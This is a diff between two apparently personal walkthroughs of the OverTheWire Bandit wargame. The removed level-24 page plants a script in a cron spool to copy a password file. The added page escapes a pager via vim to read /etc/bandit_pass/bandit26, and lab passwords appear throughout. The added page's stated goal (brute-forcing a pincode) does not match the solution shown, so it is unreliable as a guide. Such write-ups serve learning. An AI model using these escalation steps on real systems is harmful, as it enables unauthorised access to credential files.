@@ -1,72 +1,37 @@
-<h1>Bandit 24</h1>
+<h1>Bandit 25</h1>
 
 <h2 id="level-goal">Level Goal</h2>
-<p>A program is running automatically at regular intervals from
-<strong>cron</strong>, the time-based job scheduler. Look in <strong>/etc/cron.d/</strong> for
-the configuration and see what command is being executed.</p>
-
-<p><strong>NOTE:</strong> This level requires you to create your own first
-shell-script. This is a very big step and you should be proud of
-yourself when you beat this level!</p>
-
-<p><strong>NOTE 2:</strong> Keep in mind that your shell script is removed once
-executed, so you may want to keep a copy around…</p>
-
-<h2 id="commands-you-may-need-to-solve-this-level">Commands you may need to solve this level</h2>
-<p>cron, crontab, crontab(5) (use “man 5 crontab” to access this)</p>
+<p>A daemon is listening on port 30002 and will give you the password for
+bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode.
+There is no way to retrieve the pincode except by going through all of the 10000
+combinations, called brute-forcing.</p>
 
 
 <h1>Solution</h1>
 
 ```
-user@host:~$ ssh bandit23@bandit.labs.overthewire.org -p 2220
-jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+user@host:~$ ssh bandit25@bandit.labs.overthewire.org -p 2220
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
 
-bandit23@bandit:~$ ls
-bandit23@bandit:~$ ls /etc/cron.d/
-cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24
-cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root
-bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
-@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
-* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
-bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
-#!/bin/bash
+bandit25@bandit:~$ cat /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+bandit25@bandit:~$ cat /usr/bin/showtext
+#!/bin/sh
 
-myname=$(whoami)
+export TERM=linux
 
-cd /var/spool/$myname
-echo "Executing and deleting all scripts in /var/spool/$myname:"
-for i in * .*;
-do
-    if [ "$i" != "." -a "$i" != ".." ];
-    then
-        echo "Handling $i"
-        owner="$(stat --format "%U" ./$i)"
-        if [ "${owner}" = "bandit23" ]; then
-            timeout -s 9 60 ./$i
-        fi
-        rm -f ./$i
-    fi
-done
+more ~/text.txt
+exit 0
 ```
 
-If we have a file that is owned by ourself in that directory, it will be executed!
+So if we rescale our terminal, then not all text should be printed at once and we can interact using vim.
 
 ```
-bandit23@bandit:~$ mkdir /tmp/mytmp
-bandit23@bandit:~$ vim /tmp/mytmp/runme.sh
-  #!/bin/bash
-  cat /etc/bandit_pass/bandit24 >> /tmp/mytmp/psswrd.txt
-bandit23@bandit:~$ touch /tmp/mytmp/psswrd.txt
-bandit23@bandit:~$ chmod 777 -R /tmp/mytmp/
-bandit23@bandit:~$ cp /tmp/mytmp/runme.sh /var/spool/bandit24/runme.sh
+bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost
+v
+:e /etc/bandit_pass/bandit26
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
 ```
 
-And after waiting a minute:
-
-```
-bandit23@bandit:~$ cat /tmp/mytmp/psswrd.txt
-UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
-```
-
-<a href="bandit23.md">Level 23</a>             <a href="bandit25.md">Level 25</a>
+<a href="bandit24.md">Level 24</a>
+<a href="bandit26.md">Level 26</a>
